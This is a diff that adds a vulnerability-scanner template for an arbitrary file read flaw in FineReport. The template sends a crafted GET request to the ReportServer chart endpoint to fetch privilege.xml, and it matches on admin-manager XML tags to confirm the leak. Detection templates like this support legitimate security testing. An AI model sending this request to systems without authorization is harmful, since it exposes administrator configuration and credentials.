@@ -1,0 +1,26 @@
+id: finereport-arbitrary-file-read
+
+info:
+  name: FineReport Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    FineReport suffers from an arbitrary file read vulnerability.
+  tags: disclosure
+
+http:
+  - raw:
+      - |
+        GET /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<?xml version="
+          - "<PrivilegeManager"
+          - "<rootManagerName>"
